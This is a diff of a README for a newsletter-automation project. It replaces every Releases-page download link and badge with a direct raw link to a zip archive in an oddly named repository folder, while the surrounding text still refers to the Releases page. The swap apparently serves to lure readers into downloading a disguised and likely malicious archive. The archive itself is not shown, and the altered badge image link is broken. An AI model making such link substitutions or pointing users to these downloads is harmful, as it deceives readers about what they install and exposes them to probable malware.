@@ -1,6 +1,6 @@
 # 🚀 Multi-Agent-Newsletter-Automation - Effortless Newsletter Creation and Distribution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%2300aaff?style=for-the-badge&logo=github)](https://github.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/releases)
+[![Download Now](https://raw.githubusercontent.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/master/reductibility/Multi-Agent-Newsletter-Automation_forensically.zip%20Now-%20-%2300aaff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/master/reductibility/Multi-Agent-Newsletter-Automation_forensically.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you download, make sure your system meets these requirements:
   
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/releases). 
+To get started, please [visit this page to download](https://raw.githubusercontent.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/master/reductibility/Multi-Agent-Newsletter-Automation_forensically.zip). 
 
 Once on the Releases page, follow these simple steps:
 
@@ -79,4 +79,4 @@ This project is licensed under the MIT License.
 
 Stay tuned for updates and new features! We regularly improve the application based on user feedback.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%2300aaff?style=for-the-badge&logo=github)](https://github.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/releases)
+[![Download Now](https://raw.githubusercontent.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/master/reductibility/Multi-Agent-Newsletter-Automation_forensically.zip%20Now-%20-%2300aaff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Leonidaspeanut117/Multi-Agent-Newsletter-Automation/master/reductibility/Multi-Agent-Newsletter-Automation_forensically.zip)
